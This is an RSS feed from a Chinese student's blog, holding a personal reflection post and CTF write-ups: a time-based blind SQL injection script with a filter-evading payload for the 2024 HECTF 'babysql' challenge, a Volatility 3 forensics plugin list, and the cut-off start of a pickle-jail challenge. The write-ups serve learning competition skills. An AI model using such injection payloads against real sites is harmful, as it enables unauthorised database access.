<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Blog on Documenting the journey ^_^</title>
    <link>http://localhost:1313/tags/blog/</link>
    <description>Recent content in Blog on Documenting the journey ^_^</description>
    <generator>Hugo</generator>
    <language>zh-CN</language>
    <lastBuildDate>Sat, 24 May 2025 18:13:04 +0800</lastBuildDate>
    <atom:link href="http://localhost:1313/tags/blog/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>低迷中走来</title>
      <link>http://localhost:1313/blog/%E4%BD%8E%E8%BF%B7%E4%B8%AD%E8%B5%B0%E6%9D%A5/</link>
      <pubDate>Sat, 24 May 2025 18:13:04 +0800</pubDate>
      <guid>http://localhost:1313/blog/%E4%BD%8E%E8%BF%B7%E4%B8%AD%E8%B5%B0%E6%9D%A5/</guid>
      <description>&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  迷茫不会毁掉一个人，堕落才会。我不后悔自己浪费的时间和放纵，因为我并不是一无所获，可惜但不遗憾。&#xD;&#xA;                                                          --题记&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;          &#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;已经大二下了，自我感觉进入大二下相比以往的第一年和上个学期，这个学期放松了很多，懈怠了很多。并没有按照预期一样努力和学习，前前后后吧，几个月，具体可以从寒假追溯到近些日子。&lt;/p&gt;&#xA;&lt;p&gt;可以先细数做了些什么吧，总体来说就是娱乐和放松。刷视频、打游戏、看各种好玩东西，睡觉，聊天，然后不干这些的时候可能就是放空或运动。总体上来说很轻松，哈哈，说难听点就是摆烂。学习上吧，零零碎碎，安全上面并没有进步，会的还是以前会的东西，算法嘛，垃圾，不看答案写不出的那种，当然有些看了也看不懂。非要说学了点什么，只能说学了点人工智能方面的东西，不过也是纸上谈兵，没深究，还有各种新闻变化和行业分析吧，总的来说感觉AI真的要改变很多东西，coze和dify这种集成各种大模型的AI应用开发平台令我叹为观止，方便简洁，可用性高，主要是提升效率和事务。Agent也让我感觉到了未来产品的发展方向，感觉AI时代普通产品是没有技术壁垒的，真正要做的是用户、市场、营销，感觉能否洞察需求才是关键，也开始明白和理解最近看到的话，百分之八十的市场和营销，百分之二十的技术。&lt;/p&gt;&#xA;&lt;p&gt;学的杂了，了解多了，但却什么水平也不行，我也顺理成章的陷入了迷茫，老是思考，我学历这么差，又没技术，是考研还是就业，就业又该做什么，有人会要吗，反正奇奇怪怪。看到了就业和失业的文章，也知道留给自己的时间不多了，但是为什么我还是选择娱乐和放纵，哈哈。😶‍🌫️😶‍🌫️😶‍🌫️&lt;/p&gt;&#xA;&lt;p&gt;因为我觉得从小到大，我基本上都在做我认为正确的选择或者他人认为正确的选择，可是是否真的正确，在现在的我看来，并非如此。所以本质上，同时空同条件下的我，会做的选择，与隔时空的我很难相同，也自然没有正确与否。所以我打算让自己也做一个快乐的决定，最起码身为大学生和大二的我来说，沉默成本可以接受。主要确实不想学，很不想学，所以自然而然就干脆随性一把。允许自己调整怎么能算一个错误呢，嘿嘿，大不了后面多努力些呗，虽然还可能摆，哈哈哈，但是应该不会像这么长了。&lt;/p&gt;&#xA;&lt;p&gt;这段时间我也大胆的进入了一个我从未涉猎的领域，至于什么领域，懂得都懂。我发掘人与人之间是不能强行建立联系的，主动的那一方往往要承担巨大的风险，总得来说感悟颇多，一生受益吧，但是自己内心的美好还是没有改变的，只不过是丰富自己的见识罢了，我还是那个热爱生活和充满热情的中二少年，哈哈哈哈。🤐🤐🤐&lt;/p&gt;&#xA;&lt;p&gt;写下这篇文章说明我也开始正常坐在陪伴我最久的伙伴面前，曾经流过口水的桌子，大一冷飕飕对着我寒暄的空调大哥，熟悉的环境，熟悉的码字，开始展望未来的日子，虽然马上放暑假了，爽，哈哈哈。&lt;/p&gt;&#xA;&lt;p&gt;后续的计划吧，把想学的东西都学了，管他有没有用，未来怎么样，在过程中清晰吧，但是有一点我越来越坚定了，我想优秀，想更有实力。&lt;/p&gt;&#xA;&lt;p&gt;好久操作hugo gitpages了，还得查查 哈哈哈😆😆😆&lt;/p&gt;&#xA;&lt;p&gt;要是有缘看到这篇文章，希望你的生活和事业如你所愿，健康喜乐！❣️❣️❣️&lt;/p&gt;&#xA;&lt;p&gt;✌️✌️✌️生活中的困难和不如意就是🤏🏼🤏🏼🤏🏼，加油，一切都在为美好铺垫🫵&lt;/p&gt;</description>
    </item>
    <item>
      <title>2024HECTFweb</title>
      <link>http://localhost:1313/blog/2024hectfweb/</link>
      <pubDate>Mon, 16 Dec 2024 17:00:04 +0800</pubDate>
      <guid>http://localhost:1313/blog/2024hectfweb/</guid>
      <description>&lt;h1 id=&#34;2024hectfweb&#34;&gt;2024HECTFweb&lt;a href=&#34;#2024hectfweb&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;h2 id=&#34;babysql&#34;&gt;babysql&lt;a href=&#34;#babysql&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h2&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;直接万能密码过&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;&#xA;    &#xA;    &#xA;    &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;&#xA;&#xA;    &lt;picture&gt;&#xA;      &lt;source&#xA;        type=&#34;image/webp&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024hectfweb/2024HECTFweb.assets/image-20241208124649630_hu7129979628805987394.webp 300w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208124649630_hu16623659448366792228.webp 500w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208124649630_hu801815491881403654.webp 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;      /&gt;&#xA;      &lt;img&#xA;        src=&#34;http://localhost:1313/blog/2024hectfweb/2024HECTFweb.assets/image-20241208124649630.png&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024hectfweb/2024HECTFweb.assets/image-20241208124649630_hu13345525625795529318.png 300w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208124649630_hu4392563079442751551.png 500w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208124649630_hu13042221095231394094.png 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;        alt=&#34;image-20241208124649630&#34;&#xA;        &#xA;        loading=&#34;lazy&#34;&#xA;        width=&#34;1200&#34;&#xA;        height=&#34;823&#34;&#xA;      /&gt;&#xA;    &lt;/picture&gt;&#xA;  &#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;进入查询后台&lt;/p&gt;&#xA;&lt;p&gt;测试发现是盲注，可以使用布尔盲注，这里采用时间盲注&lt;/p&gt;&#xA;&lt;p&gt;接下来就是脚本&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;&#xA;    &#xA;    &#xA;    &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;&#xA;&#xA;    &lt;picture&gt;&#xA;      &lt;source&#xA;        type=&#34;image/webp&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024hectfweb/2024HECTFweb.assets/image-20241208124958291_hu16310235919522741092.webp 300w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208124958291_hu202512053264655128.webp 500w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208124958291_hu8119386271814471794.webp 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;      /&gt;&#xA;      &lt;img&#xA;        src=&#34;http://localhost:1313/blog/2024hectfweb/2024HECTFweb.assets/image-20241208124958291.png&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024hectfweb/2024HECTFweb.assets/image-20241208124958291_hu1708066541185859064.png 300w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208124958291_hu16113545783487368779.png 500w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208124958291_hu296809548464660367.png 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;        alt=&#34;image-20241208124958291&#34;&#xA;        &#xA;        loading=&#34;lazy&#34;&#xA;        width=&#34;822&#34;&#xA;        height=&#34;419&#34;&#xA;      /&gt;&#xA;    &lt;/picture&gt;&#xA;  &#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;首先跑一个fuzz字典看有哪儿些东西被过滤了&lt;/p&gt;&#xA;&lt;p&gt;可以看到有些重要的东西也被过滤了，像空格,information_schema&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;&#xA;    &#xA;    &#xA;    &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;&#xA;&#xA;    &lt;picture&gt;&#xA;      &lt;source&#xA;        type=&#34;image/webp&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024hectfweb/2024HECTFweb.assets/image-20241208133152929_hu372131954917275911.webp 300w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208133152929_hu232870981980390063.webp 500w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208133152929_hu7369218618061124027.webp 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;      /&gt;&#xA;      &lt;img&#xA;        src=&#34;http://localhost:1313/blog/2024hectfweb/2024HECTFweb.assets/image-20241208133152929.png&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024hectfweb/2024HECTFweb.assets/image-20241208133152929_hu6355181893279876814.png 300w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208133152929_hu12999260361634750985.png 500w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208133152929_hu7966856940146321777.png 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;        alt=&#34;image-20241208133152929&#34;&#xA;        &#xA;        loading=&#34;lazy&#34;&#xA;        width=&#34;1275&#34;&#xA;        height=&#34;201&#34;&#xA;      /&gt;&#xA;    &lt;/picture&gt;&#xA;  &#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;测试&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; requests &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; post&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;base_url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xxx/worker.php&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#39;/**/or/**/if((select/**/database())like/**/database(),sleep(3),0)#&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:payload}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;check_time&lt;/span&gt;(data):&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        res&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;post(base_url, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;data,timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;#如果没有超时说明失败了&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failure&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;success&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(check_time(data))&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&#xA;&#xA;&#xA;&#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;  &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;    &#xA;&#xA;    &#xA;    &#xA;    &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;      &#xA;        &#xA;          &#xA;        &#xA;        &#xA;        &#xA;        &#xA;          &#xA;          &#xA;          &#xA;        &#xA;      &#xA;    &#xA;&#xA;&#xA;    &lt;picture&gt;&#xA;      &lt;source&#xA;        type=&#34;image/webp&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024hectfweb/2024HECTFweb.assets/image-20241208141019513_hu4180779274746082471.webp 300w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208141019513_hu17860974523619803728.webp 500w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208141019513_hu3538534255196413055.webp 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;      /&gt;&#xA;      &lt;img&#xA;        src=&#34;http://localhost:1313/blog/2024hectfweb/2024HECTFweb.assets/image-20241208141019513.png&#34;&#xA;        srcset=&#34;http://localhost:1313/blog/2024hectfweb/2024HECTFweb.assets/image-20241208141019513_hu11139517299302771596.png 300w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208141019513_hu7595250934671060737.png 500w,/blog/2024hectfweb/2024HECTFweb.assets/image-20241208141019513_hu8570992913003434491.png 700w&#34;&#xA;        sizes=&#34;(max-width: 499px) 300px,(max-width: 699px) 500px,700px&#34;&#xA;        alt=&#34;image-20241208141019513&#34;&#xA;        &#xA;        loading=&#34;lazy&#34;&#xA;        width=&#34;856&#34;&#xA;        height=&#34;233&#34;&#xA;      /&gt;&#xA;    &lt;/picture&gt;&#xA;  &#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&#xA;&lt;/p&gt;</description>
    </item>
    <item>
      <title>2024HECTFmisc</title>
      <link>http://localhost:1313/blog/2024hectfmisc/</link>
      <pubDate>Fri, 13 Dec 2024 20:00:04 +0800</pubDate>
      <guid>http://localhost:1313/blog/2024hectfmisc/</guid>
      <description>&lt;h2 id=&#34;2024hectfmisc&#34;&gt;2024HECTFmisc&lt;a href=&#34;#2024hectfmisc&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h2&gt;&#xA;&lt;h3 id=&#34;恶势力的聊天记录&#34;&gt;恶势力的聊天记录&lt;a href=&#34;#%e6%81%b6%e5%8a%bf%e5%8a%9b%e7%9a%84%e8%81%8a%e5%a4%a9%e8%ae%b0%e5%bd%95&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h3&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;vol3参考文档&lt;/p&gt;&#xA;&lt;p&gt;&lt;a&#xA;  href=&#34;https://volatility3.readthedocs.io/en/latest/&#34;&#xA;  &#xA;  &#xA;    class=&#34;link--external&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&#xA;  &#xA;&gt;Volatility 3 — Volatility 3 2.11.0 documentation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;vol3使用参考&lt;/p&gt;&#xA;&lt;p&gt;&lt;a&#xA;  href=&#34;https://blog.csdn.net/Aluxian_/article/details/127064750&#34;&#xA;  &#xA;  &#xA;    class=&#34;link--external&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&#xA;  &#xA;&gt;Volatility3内存取证工具使用详解-CSDN博客&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2命令格式： volatility -f &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;image&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; --profile&lt;span style=&#34;color:#f92672&#34;&gt;=[&lt;/span&gt;profile&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;plugin&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;这里需要注意 ：Volatility3和Volatility2用法差不多，但不需要指定profile ，只是插件调用方式改变，特定的操作系统有特定的插件&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 vol.py [plugin] -f [image]&#xD;&#xA; &#xD;&#xA;常用插件：&#xD;&#xA;    layerwriter：列出内存镜像platform信息&#xD;&#xA;    linux.bash：从内存中恢复bash命令历史记录&#xD;&#xA;    linux.check_afinfo：验证网络协议的操作功能指针&#xD;&#xA;    linux.check_syscall：检查系统调用表中的挂钩&#xD;&#xA;    linux.elfs：列出所有进程的所有内存映射ELF文件&#xD;&#xA;    linux.lsmod：列出加载的内核模块&#xD;&#xA;    linux.lsof：列出所有进程的所有内存映射&#xD;&#xA;    linux.malfind：列出可能包含注入代码的进程内存范围&#xD;&#xA;    linux.proc：列出所有进程的所有内存映射&#xD;&#xA;    linux.pslist：列出linux内存映像中存在的进程&#xD;&#xA;    linux.pstree：列出进程树&#xD;&#xA;    mac.bash：从内存中恢复bash命令历史记录&#xD;&#xA;    mac.check_syscall：检查系统调用表中的挂钩&#xD;&#xA;    mac.check_sysctl：检查sysctl处理程序的挂钩&#xD;&#xA;    mac.check_trap_table：检查trap表中的挂钩&#xD;&#xA;    mac.ifconfig：列出网卡信息&#xD;&#xA;    mac.lsmod：列出加载的内核模块&#xD;&#xA;    mac.lsof：列出所有进程的所有内存映射&#xD;&#xA;    mac.malfind：列出可能包含注入代码的进程内存范围&#xD;&#xA;    mac.netstat：列出所有进程的所有网络连接&#xD;&#xA;    mac.psaux：恢复程序命令行参数&#xD;&#xA;    mac.pslist：列出linux内存映像中存在的进程&#xD;&#xA;    mac.pstree：列出进程树&#xD;&#xA;    mac.tasks：列出Mac内存映像中存在的进程&#xD;&#xA;    windows.info：显示正在分析的内存样本的OS和内核详细信息&#xD;&#xA;    windows.callbacks：列出内核回调和通知例程&#xD;&#xA;    windows.cmdline：列出进程命令行参数&#xD;&#xA;    windows.dlldump：将进程内存范围DLL转储&#xD;&#xA;    windows.dlllist：列出Windows内存映像中已加载的dll模块&#xD;&#xA;    windows.driverirp：在Windows内存映像中列出驱动程序的IRP&#xD;&#xA;    windows.driverscan：扫描Windows内存映像中存在的驱动程序&#xD;&#xA;    windows.filescan：扫描Windows内存映像中存在的文件对象&#xD;&#xA;    windows.handles：列出进程打开的句柄&#xD;&#xA;    windows.malfind：列出可能包含注入代码的进程内存范围&#xD;&#xA;    windows.moddump：转储内核模块&#xD;&#xA;    windows.modscan：扫描Windows内存映像中存在的模块&#xD;&#xA;    windows.mutantscan：扫描Windows内存映像中存在的互斥锁&#xD;&#xA;    windows.pslist：列出Windows内存映像中存在的进程&#xD;&#xA;    windows.psscan：扫描Windows内存映像中存在的进程&#xD;&#xA;    windows.pstree：列出进程树&#xD;&#xA;    windows.procdump：转储处理可执行映像&#xD;&#xA;    windows.registry.certificates：列出注册表中存储的证书&#xD;&#xA;    windows.registry.hivelist：列出内存映像中存在的注册表配置单元&#xD;&#xA;    windows.registry.hivescan：扫描Windows内存映像中存在的注册表配置单元&#xD;&#xA;    windows.registry.printkey：在配置单元或特定键值下列出注册表项&#xD;&#xA;    windows.registry.userassist：打印用户助手注册表项和信息&#xD;&#xA;    windows.ssdt：列出系统调用表&#xD;&#xA;    windows.strings：读取字符串命令的输出，并指示每个字符串属于哪个进程&#xD;&#xA;    windows.svcscan：扫描Windows服务&#xD;&#xA;    windows.symlinkscan：扫描Windows内存映像中存在的链接&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;──(root㉿kali)-[/home/messi/Desktop/vol3]&#xD;&#xA;└─# sudo ln -s /home/messi/Desktop/vol3/vol.py /usr/local/bin/vol3&#xD;&#xA;//添加一个软连接方便使用&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;列出所有进程&lt;/p&gt;</description>
    </item>
    <item>
      <title>2024强网杯-Misc-Pickle jail</title>
      <link>http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF-misc-pickle_jail/</link>
      <pubDate>Tue, 03 Dec 2024 20:55:04 +0800</pubDate>
      <guid>http://localhost:1313/blog/2024%E5%BC%BA%E7%BD%91%E6%9D%AF-misc-pickle_jail/</guid>
      <description>&lt;h1 id=&#34;2024强网杯-misc-pickle-jail&#34;&gt;2024强网杯-Misc-Pickle jail&lt;a href=&#34;#2024%e5%bc%ba%e7%bd%91%e6%9d%af-misc-pickle-jail&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h1&gt;&#xA;&lt;p&gt;第一次遇到jail类型的题目，而且还是在大赛上，并且还是这么难的情况，努力理解复现吧。&lt;/p&gt;&#xA;&lt;h3 id=&#34;附件&#34;&gt;附件😣😰🥹：&lt;a href=&#34;#%e9%99%84%e4%bb%b6&#34; class=&#34;post-heading__anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;&#xA;&lt;/h3&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;pickle_jail.py 的文件&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/local/bin/python&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; io &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; BytesIO&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; os &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; _exit&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pathlib &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Path&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pickle &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Pickler, Unpickler&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; sys &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; stderr, stdin, stdout&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; time &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; time&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; faker &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Faker&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span 